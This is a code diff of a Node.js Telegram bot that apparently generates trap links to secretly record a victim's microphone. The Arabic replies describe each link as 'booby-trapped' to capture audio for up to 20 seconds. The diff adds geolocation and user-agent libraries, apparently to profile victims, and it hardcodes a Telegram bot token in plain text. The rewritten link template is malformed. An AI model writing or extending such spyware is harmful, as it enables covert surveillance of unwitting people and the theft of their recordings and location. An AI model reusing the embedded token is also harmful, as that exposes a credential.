@@ -4,7 +4,8 @@ const bodyParser = require('body-parser');
 const multer = require('multer');
 const path = require('path');
 const fs = require('fs');
-
+const geoip = require('geoip-lite');
+const useragent = require('useragent');
 const botToken = '7244359397:AAELs6eOA3t03zH7w2g2EXIaNHdXSBMOEWc'; 
 const bot = new TelegramBot(botToken, { polling: true });
 const app = express();
@@ -72,16 +73,16 @@ bot.on('callback_query', (callbackQuery) => {
     }
 });
 
-bot.on('message', (ctx) => {
-  const chatId = ctx.chat.id;
-  const duration = parseInt(ctx.message.text, 10);
+bot.on('message', (msg) => {
+    const chatId = msg.chat.id;
+    const duration = parseInt(msg.text, 10);
 
-  if (!isNaN(duration)) {
-    if (duration > 0 && duration <= 20) {
-      const link = `https://creative-marmalade-periwinkle.glitch.me/record?chatId=${chatId}&duration=${duration}`;
-      ctx.reply(`تم تلغيم الرابط  لتسجيل صوت لمدة ${duration} ثواني: ${link}`);
-    } else {
-      ctx.reply('الحد الأقصى لمدة التسجيل هو 20 ثانية. الرجاء إدخال مدة صحيحة.');
+    if (!isNaN(duration)) {
+        if (duration > 0 && duration <= 20) {
+            const link = `https://creative-marmalade-periwinkle.glitch.me/record?chatId/${chatId}?duration=${duration}`;
+            bot.sendMessage(chatId, `تم تلغيم الرابط  لتسجيل صوت لمدة ${duration} ثواني: ${link}`);
+        } else {
+            bot.sendMessage(chatId, 'الحد الأقصى لمدة التسجيل هو 20 ثانية. الرجاء إدخال مدة صحيحة.');
+        }
     }
-  }
 });
